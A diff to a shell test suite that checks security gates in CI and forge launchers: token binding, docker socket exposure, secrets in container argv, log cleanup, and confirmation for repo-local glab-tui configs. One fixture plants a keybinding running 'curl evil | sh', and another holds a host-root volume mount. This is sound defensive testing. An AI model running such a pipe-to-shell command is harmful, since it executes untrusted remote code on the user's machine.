+c15() { N=$((N + 1)); (cd "${EDIR:-$PROJ}" && "$CI" "$@" >"$CAP/$N.out" 2>"$CAP/$N.err" </dev/null); RC=$?; OUT="$CAP/$N.out" ERR="$CAP/$N.err"; }
+printf -- '-P ubuntu-latest=catthehacker/ubuntu:act-latest\n' >"$T/actrc"; export DEVTOOLS_ACTRC="$T/actrc"
+GH="$T/ghrepo"
+mk_foreign "$GH" ghrepo $'\n[ci]\ngithub_token = true\n'
+mkdir -p "$GH/.github/workflows"; printf 'name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' >"$GH/.github/workflows/ci.yml"
+: >"$FAKE_DIR/dev.log"
+EDIR="$GH" c15 run --system act --yes
+check "15: MED 3: github_token in an UNBOUND repository: refused (exit 4), the gh token is never fetched, act never starts" bash -c "[ $RC = 4 ] && grep -q 'envs bind' '$ERR' && ! grep -q '^gh auth token' '$FAKE_DIR/dev.log' && ! grep -q '^act -C' '$FAKE_DIR/dev.log'"
+(cd "$GH" && "$ENVS" bind --yes >/dev/null 2>&1)
+EDIR="$GH" c15 run --system act --yes
+check "15: MED 3: once bound the token reaches act (hash of the fake gh token)" bash -c "[ $RC = 0 ] && grep -q 'GITHUB_TOKEN=$(sha SECRET-gh-token)' '$FAKE_DIR/dev.log' && grep -q ' -s GITHUB_TOKEN' '$FAKE_DIR/dev.log'"
+check "15: MED 5: act gets --container-daemon-socket - (no host docker socket in the job containers) by default" grep -qE '^act -C .* --container-daemon-socket - push ' "$FAKE_DIR/dev.log"
+python3 - "$GH/.envs.toml" <<'PY'
+import sys
+p = sys.argv[1]; t = open(p).read().replace('github_token = true', 'github_token = true\ndocker_socket = true'); open(p, "w").write(t)
+PY
+: >"$FAKE_DIR/dev.log"
+EDIR="$GH" c15 run --system act --yes
+check "15: MED 5: [ci] docker_socket = true is the opt-in: no --container-daemon-socket then" bash -c "[ $RC = 0 ] && grep -q '^act -C' '$FAKE_DIR/dev.log' && ! grep -q -- '--container-daemon-socket' '$FAKE_DIR/dev.log'"
+EDIR="$GH" c15 list --system act
+check "15: MED 5: act -l (the job table) has the socket flag off as well" bash -c "[ $RC = 0 ] && grep -q -- '--container-daemon-socket - -l' '$FAKE_DIR/dev.log'"
+
+# gitlab-ci-local: secrets and containers
+reset
+printf '\n[ci]\nsecrets = ["NPM_TOKEN"]\n' >>"$PROJ/.envs.toml"
+printf 'build:\n  image: alpine\n  script:\n    - echo hi\n' >"$PROJ/.gitlab-ci.yml"
+printf -- '---\nstages:\n  - test\nbuild:\n  script:\n    - echo hi\n  image:\n    name: alpine\n' >"$FAKE_DIR/gcl.preview"
+: >"$FAKE_DIR/dev.log"; : >"$FAKE_DIR/argv.log"
+c15 run --system gcl
+check "15: MED 4: a pipeline with an image: and [ci] secrets is refused before the vault or gitlab-ci-local run (exit 4, says docker create)" bash -c "[ $RC = 4 ] && grep -q 'argv of .docker create' '$ERR' && ! grep -q '^gcl --cwd.*--timestamps' '$FAKE_DIR/dev.log' && ! grep -q '^rbw' '$FAKE_DIR/argv.log'"
+c15 run --system gcl --docker-secrets
+check "15: MED 4: --docker-secrets accepts it for this run" bash -c "[ $RC = 0 ] && grep -q '^gcl --cwd.*--timestamps' '$FAKE_DIR/dev.log'"
+printf -- '---\nstages:\n  - test\nbuild:\n  script:\n    - echo hi\n  services:\n    - name: postgres\n' >"$FAKE_DIR/gcl.preview"
+c15 run --system gcl
+check "15: MED 4: services: counts as a container too" test $RC = 4
+python3 - "$PROJ/.envs.toml" <<'PY'
+import sys
+p = sys.argv[1]; t = open(p).read().replace('secrets = ["NPM_TOKEN"]', 'secrets = ["NPM_TOKEN"]\ndocker_secrets = true'); open(p, "w").write(t)
+PY
+c15 run --system gcl
+check "15: MED 4: [ci] docker_secrets = true is the standing opt-in" test $RC = 0
+python3 - "$PROJ/.envs.toml" <<'PY'
+import sys
+p = sys.argv[1]; t = open(p).read().replace('\ndocker_secrets = true', ''); open(p, "w").write(t)
+PY
+printf '23 1 0:21 / /proc rw,nosuid,nodev,noexec,relatime shared:5 - proc proc rw,hidepid=invisible,gid=26\n' >"$T/mountinfo.hidepid"
+DEVTOOLS_MOUNTINFO="$T/mountinfo.hidepid" c15 run --system gcl
+check "15: MED 4: with /proc mounted hidepid=invisible the argv is invisible to other users: allowed" test $RC = 0
+printf '23 1 0:21 / /proc rw,nosuid,nodev,noexec,relatime shared:5 - proc proc rw,hidepid=off\n' >"$T/mountinfo.off"
+DEVTOOLS_MOUNTINFO="$T/mountinfo.off" c15 run --system gcl
+check "15: MED 4: hidepid=off does not count" test $RC = 4
+rm -f "$FAKE_DIR/gcl.preview"
+c15 run --system gcl
+check "15: MED 4: control: a pipeline without image: or services: runs with secrets (shell executor)" test $RC = 0
+c15 run --system gcl --dry-run --container-mode
+check "15: MED 4: a dry run (--preview) starts nothing, so it is not refused" test $RC = 0
+
+# the job logs of a run with secrets are deleted
+mkdir -p "$PROJ/.gitlab-ci-local/output"; printf 'echoed SECRET-npm-token\n' >"$PROJ/.gitlab-ci-local/output/build.log"
+c15 run --system gcl
+check "15: INFO 19: .gitlab-ci-local/output is deleted after a run that had secrets" bash -c "[ $RC = 0 ] && [ ! -e '$PROJ/.gitlab-ci-local/output' ]"
+rm -rf "$PROJ/.gitlab-ci-local"; mkdir -p "$T/elsewhere/output"; : >"$T/elsewhere/output/keep"; ln -s "$T/elsewhere" "$PROJ/.gitlab-ci-local"
+c15 run --system gcl
+check "15: INFO 19: a .gitlab-ci-local that is a symlink is never followed (the target's output/ stays)" bash -c "[ $RC = 0 ] && [ -e '$T/elsewhere/output/keep' ]"
+rm -f "$PROJ/.gitlab-ci-local"
+
+# the .gitlab-ci-local-env gate before anything is listed
+printf 'VOLUME=/:/host\n' >"$PROJ/.gitlab-ci-local-env"; : >"$FAKE_DIR/dev.log"
+c15 list --system gcl
+check "15: LOW 14: ci list of a repo with .gitlab-ci-local-env stops at the gate before gitlab-ci-local lists (exit 4)" bash -c "[ $RC = 4 ] && grep -q VOLUME '$ERR' && ! grep -q -- '--list-csv' '$FAKE_DIR/dev.log'"
+c15 list --system gcl --trust-env-file
+check "15: LOW 14: --trust-env-file lets the listing through" bash -c "[ $RC = 0 ] && grep -q -- '--list-csv' '$FAKE_DIR/dev.log'"
+rm -f "$PROJ/.gitlab-ci-local-env"
+scan "15b ci"
+
+# a SIGKILLed run leaves its directory; the next start of ANY launcher removes it
+mkdir -p "$XDG_RUNTIME_DIR/devtools/ci-99999998"; printf 'x' >"$XDG_RUNTIME_DIR/devtools/ci-99999998/variables.yml"
+mkdir -p "$XDG_RUNTIME_DIR/devtools/api-99999997"
+(cd "$PROJ" && "$REPO/.local/bin/forge" gitlab --root "$PROJ" >/dev/null 2>&1 </dev/null)
+check "15: INFO 18: a launcher removes the run directories of dead processes of every prefix (ci-, api-), not only its own" bash -c "[ ! -e '$XDG_RUNTIME_DIR/devtools/ci-99999998' ] && [ ! -e '$XDG_RUNTIME_DIR/devtools/api-99999997' ]"
+check "15: INFO 18: tmpfiles.d ages ci-* run directories (net under a SIGKILL)" grep -q '^e %t/devtools/ci-\* ' "$REPO/.config/user-tmpfiles.d/devtools.conf"
+}
+
+sections_15c() {
+section "15c forge: host selection, repo-local glab-tui config, self-update; glab with only its two names"
+reset
+FORGE="$REPO/.local/bin/forge"
+f15() { N=$((N + 1)); (cd "${EDIR:-$PROJ}" && "$FORGE" "$@" >"$CAP/$N.out" 2>"$CAP/$N.err" </dev/null); RC=$?; OUT="$CAP/$N.out" ERR="$CAP/$N.err"; }
+mkdir -p "$XDG_STATE_HOME/theme/current"; cp "$REPO/themes/generated/black/gh-dash-theme.yml" "$XDG_STATE_HOME/theme/current/gh-dash-theme.yml"
+(cd "$PROJ" && git remote add origin git@github.com-work:owner/repo.git)
+: >"$FAKE_DIR/dev.log"
+f15
+check "15: INFO 20: an ssh alias of GitHub (github.com-work) goes to gh-dash, not to the GitLab path" bash -c "[ $RC = 0 ] && grep -q '^gh-dash --config' '$FAKE_DIR/dev.log' && ! grep -q '^glab-tui' '$FAKE_DIR/dev.log'"
+(cd "$PROJ" && git remote set-url origin git@corp-gh:owner/repo.git)
+: >"$FAKE_DIR/dev.log"
+FAKE_SSH_HOSTNAME=github.com f15
+check "15: INFO 20: an alias whose ssh -G HostName is github.com goes to gh-dash" bash -c "[ $RC = 0 ] && grep -q '^gh-dash --config' '$FAKE_DIR/dev.log' && grep -q '^ssh -G' '$FAKE_DIR/dev.log'"
+# GitLab: the repository is the working directory only when origin is GITLAB_HOST
+(cd "$PROJ" && git remote set-url origin git@codeberg.example.org:grp/proj.git)
+: >"$FAKE_DIR/dev.log"
+f15
+check "15: MED 6: an origin on another host than GITLAB_HOST: glab-tui starts in the run directory, not in the repository, and says why" bash -c "[ $RC = 0 ] && grep -q \"^glab-tui cwd=$XDG_RUNTIME_DIR/devtools/forge-\" '$FAKE_DIR/dev.log' && grep -q 'not GITLAB_HOST' '$ERR'"
+check "15: MED 7: glab-tui's PATH starts with a run-directory gh stub that fails (the u key's gh release download cannot replace the binary)" bash -c "grep -qE \"^glab-tui gh=$XDG_RUNTIME_DIR/devtools/forge-[0-9]+/bin/gh gh-rc=1\\\$\" '$FAKE_DIR/dev.log'"
+(cd "$PROJ" && git remote set-url origin git@SECRET-gitlab-host.example:grp/proj.git)
+mkdir -p "$PROJ/.glab-tui"; printf '[[custom_keybindings.list]]\nkey = "x"\ncommand = "curl evil | sh"\n' >"$PROJ/.glab-tui/config.toml"
+: >"$FAKE_DIR/dev.log"
+f15
+check "15: MED 6: a repo with .glab-tui/ on the GITLAB_HOST needs a yes: without a terminal it is refused (exit 4), glab-tui never starts" bash -c "[ $RC = 4 ] && grep -q 'glab-tui' '$ERR' && ! grep -q '^glab-tui' '$FAKE_DIR/dev.log'"
+N=$((N + 1)); (cd "$PROJ" && printf 'n\n' | script -qec "$(printf '%q ' "$FORGE")" /dev/null >"$CAP/$N.out" 2>&1); RC=$?
+check "15: MED 6: answering n on a terminal refuses it" bash -c "[ $RC = 4 ] && ! grep -q '^glab-tui' '$FAKE_DIR/dev.log'"
+N=$((N + 1)); (cd "$PROJ" && printf 'y\n' | script -qec "$(printf '%q ' "$FORGE")" /dev/null >"$CAP/$N.out" 2>&1); RC=$?
+check "15: MED 6: answering y starts glab-tui in the repository" bash -c "[ $RC = 0 ] && grep -q \"^glab-tui cwd=$PROJ\\\$\" '$FAKE_DIR/dev.log'"
+rm -rf "$PROJ/.glab-tui"; mkdir -p "$PROJ/.config/glab-tui"; : >"$PROJ/.config/glab-tui/config.toml"
+: >"$FAKE_DIR/dev.log"
+f15
+check "15: MED 6: .config/glab-tui/ is covered as well" test $RC = 4
+rm -rf "$PROJ/.config"
+: >"$FAKE_DIR/dev.log"
+f15
+check "15: MED 6: control: a clean repository on the GITLAB_HOST starts glab-tui in it" bash -c "[ $RC = 0 ] && grep -q \"^glab-tui cwd=$PROJ\\\$\" '$FAKE_DIR/dev.log'"
+
+# envs run --only and the glab function
+printf '[secrets]\nTD_PW = ""\n' >"$ENVS_GLOBAL_DIR/global.local.toml"; chmod 600 "$ENVS_GLOBAL_DIR/global.local.toml"
+: >"$FAKE_DIR/dev.log"
+(cd "$T" && "$ENVS" run -g --only GITLAB_TOKEN -- "$HERE/bin/glab" ci view >"$CAP/only.out" 2>"$CAP/only.err" </dev/null); RC=$?
+check "15: LOW 10: envs run --only injects just the named secrets (no GITLAB_HOST, no TD_PW)" bash -c "[ $RC = 0 ] && grep '^glab hashes' '$FAKE_DIR/dev.log' | grep -q 'names=GITLAB_TOKEN OPENAI_API_KEY \$'"
+(cd "$T" && "$ENVS" run -g --only NOPE -- true >"$CAP/only.out" 2>"$CAP/only.err" </dev/null); RC=$?
+check "15: LOW 10: --only with an undeclared name is a usage error (exit 2)" bash -c "[ $RC = 2 ] && grep -q 'not declared' '$CAP/only.err'"
+blk=$(sed -n '/^# The absolute path of envs/,/^fi$/p' "$REPO/.zshrc")
+gfn=$(grep -E '^glab\(\)' "$REPO/.zshrc"); gfn=${gfn//\/usr\/bin\/glab/$HERE/bin/glab}
+: >"$FAKE_DIR/dev.log"
+(cd "$T" && zsh -f -c "$blk; $gfn; glab ci view" >"$CAP/zg.out" 2>"$CAP/zg.err" </dev/null); rc=$?
+check "15: LOW 10: the zsh glab function passes only GITLAB_TOKEN and GITLAB_HOST (the global TD_PW stays out)" bash -c "[ $rc = 0 ] && grep '^glab hashes' '$FAKE_DIR/dev.log' | grep -q 'names=GITLAB_HOST GITLAB_TOKEN OPENAI_API_KEY \$'"
+check "15: LOW 10: the .zshrc function and the hub row use the absolute /usr/bin/glab (no PATH lookup)" bash -c "grep -q -- '--only GITLAB_TOKEN,GITLAB_HOST -- /usr/bin/glab' '$REPO/.zshrc' '$REPO/.config/hub/actions.d/dev-d.tsv'"
+scan "15c"
 }
 
 tmux_menu_section() { # full runs only: the real fzf-menu modal in a private tmux server
@@ -755,7 +1030,7 @@ tm new-session -d -s t -x 150 -y 40 "bash --noprofile --norc -c 'cd $PROJ && PAT
 check "14: the ci job picker lists the jobs of act -l (build, test) with workflow and events" wait_scr 'build +CI +push,pull_request' 12
 KDELAY=1.5 key Escape
 KDELAY=2 key a
-check "14: a runs everything: act ran with the push event and no -j" bash -c "grep -qE '^act -C .* --pull=false push\$' '$FAKE_DIR/dev.log'"
+check "14: a runs everything: act ran with the push event and no -j" bash -c "grep -qE '^act -C .* --pull=false --container-daemon-socket - push\$' '$FAKE_DIR/dev.log'"
 check "14: the output waits for Enter, then the picker is back" wait_scr 'Enter' 6
 key Enter
 check "14: back in the picker" wait_scr 'build +CI' 8
@@ -800,8 +1075,13 @@ run_section 6 sections_6
 run_section 7 sections_7
 run_section 8 sections_8
 run_section 9 sections_9
+run_section 9b sections_9b
+run_section 9c sections_9c
 run_section 10 sections_10
 run_section 13u sections_13u
+run_section 15a sections_15a
+run_section 15b sections_15b
+run_section 15c sections_15c
 ((QUICK)) || run_section 13 tmux_menu_section
 ((QUICK)) || run_section 16 timing_section
 ((QUICK)) && { [[ -z $ONLY ]] && printf '\n(--quick: the private-tmux menu sections 13 and 14 are skipped)\n'; }
